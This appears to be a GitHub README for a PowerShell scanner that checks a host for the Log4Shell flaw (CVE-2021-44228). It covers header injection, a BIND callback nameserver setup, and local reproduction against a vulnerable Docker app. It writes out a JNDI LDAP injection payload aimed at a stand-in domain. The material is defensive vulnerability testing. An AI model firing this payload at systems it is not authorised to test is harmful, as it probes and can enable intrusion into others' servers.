# CHAPTER8 - log4j PowerShell Checker

**[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)**

Perform a scan of a single host (using Powershell) to see if it's vulnerable for the above-mentioned CVE.
The scripts inject a payload into a request header like `User-Agent`. Important to note is that this is not sufficient for all applications! For example, VMware vCenter is vulnerable because of request header `X-Forwarded-For`. So please do some more research into what the vulnerability exactly is for the software that you're testing and adapt the script where needed.

_Updates_ 

* Added outgoing proxy support.
* Added `log4j_ps_checker_vcenter.ps1` for VMware vCenter Server.
	- For VMware vRealize and VMware NXS-T: instead of using these scripts, just add the payload to username field like this: `${jndi:ldap://mytestrecord.log4jdnsreq.example.com}`

---

## Usage

* Edit the `$NameServer` parameter inside the script on line 16
* Run it like this: `.\log4j_ps_checker.ps1 https://vulnerableserver:8443`

---

## Setting up a NameServer

1. Create a new (A) subdomain record for your domain, like `log4jcheck.example.com`; and
2. Point it to the IP of your freshly provisioned Ubuntu VPS.
3. Create another record, but this time an NS record pointing to the first record:

`log4jdnsreq 3600 IN  NS log4jcheck.example.com.`

4. Install bind on your Ubuntu VPS: `$ sudo apt install bind9`
5. Add the following to `/etc/bind/named.conf.options`:

```
    recursion no;
    allow-transfer { none; };
```

6. Configure logging by adding the following to `/etc/bind/named.conf.local`:

```
logging {
	channel querylog {
		file "/var/log/named/query.log";
		severity debug 3;
		print-time yes;
	};
	category queries { querylog;};
};
```

7. Create the log file from step 6 and give it the right permissions
	- `$ sudo mkdir /var/log/named && sudo touch /var/log/named/query.log`
	- `$ sudo chown bind:bind /var/log/named/query.log && sudo chmod 660 /var/log/named/query.log`
8. Start bind: `$ sudo systemctl start bind9`
9. Test if it works:
	- Run on your local machine: `dig testing.log4jdnsreq.example.com`
	- Check if you see the request coming in on your VPS in the file: `/var/log/named/query.log`

---

## (optional) Reproducing Locally

Want to test this first before you run it against a production system? Sure!

Check out [christophetd's](https://github.com/christophetd/log4shell-vulnerable-app) vulnerable app.
Be sure to have Docker installed. Then:

`docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app`

You should see an error message indicating that a remote lookup was attempted but failed:

```
2021-12-11 19:40:12,224 http-nio-8080-exec-8 WARN Error looking up JNDI resource [ldap://check1.log4jdnsreq.example.com/test.class]. javax.naming.CommunicationException: check1.log4jdnsreq.example.com:389 [Root exception is java.net.UnknownHostException: check1.log4jdnsreq.example.com]
```

**Important**: for this test to work, you should change `User-Agent` to `X-Api-Version` on line 63 (`$JsonHeader`) as christophetd's software only works with that specific header.

---

## Credits

Thanks to [@NorthwaveSecurity](https://github.com/NorthwaveSecurity) for providing me with the Python implementation and to [@christophetd](https://github.com/christophetd) for providing me with the PoC docker image.

* https://github.com/NorthwaveSecurity/log4jcheck
* https://github.com/christophetd/log4shell-vulnerable-app
* https://www.lunasec.io/docs/blog/log4j-zero-day/
* https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6

## License

Open-sourced software licensed under the MIT license.

## Disclaimer

This script has been written specifically for Windows environments. Do not try to use it with custom ports of PowerShell.
